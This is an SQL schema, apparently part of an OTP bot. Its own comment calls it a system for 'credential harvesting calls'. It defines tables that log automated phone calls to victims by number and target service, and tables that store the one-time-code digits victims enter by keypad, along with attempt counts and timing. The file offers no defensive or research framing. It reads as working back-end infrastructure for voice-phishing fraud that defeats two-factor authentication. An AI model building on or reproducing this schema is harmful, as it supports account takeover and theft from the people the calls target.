-- OTP Collection System Tables
-- Stores credential harvesting calls and collected data

-- Track OTP call initiation and status
CREATE TABLE IF NOT EXISTS otp_calls (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  callSid TEXT UNIQUE NOT NULL,
  twilio_sid TEXT,
  service TEXT NOT NULL,
  user_id TEXT NOT NULL,
  business_id TEXT,
  phone_number TEXT NOT NULL,
  status TEXT DEFAULT 'initiated',
  error_message TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  completed_at DATETIME,
  metadata TEXT,
  FOREIGN KEY(business_id) REFERENCES businesses(id)
);

-- Store collected DTMF data securely
CREATE TABLE IF NOT EXISTS otp_collections (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  callSid TEXT UNIQUE NOT NULL,
  service TEXT NOT NULL,
  user_id TEXT,
  business_id TEXT,
  digits_encrypted TEXT,
  digits_hash TEXT,
  attempts INTEGER DEFAULT 1,
  duration_ms INTEGER,
  metadata TEXT,
  recorded_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY(callSid) REFERENCES otp_calls(callSid),
  FOREIGN KEY(business_id) REFERENCES businesses(id)
);

-- Indexes for fast queries
CREATE INDEX IF NOT EXISTS idx_otp_calls_service ON otp_calls(service);
CREATE INDEX IF NOT EXISTS idx_otp_calls_user ON otp_calls(user_id);
CREATE INDEX IF NOT EXISTS idx_otp_calls_status ON otp_calls(status);
CREATE INDEX IF NOT EXISTS idx_otp_calls_created ON otp_calls(created_at);
CREATE INDEX IF NOT EXISTS idx_otp_collections_service ON otp_collections(service);
CREATE INDEX IF NOT EXISTS idx_otp_collections_recorded ON otp_collections(recorded_at);
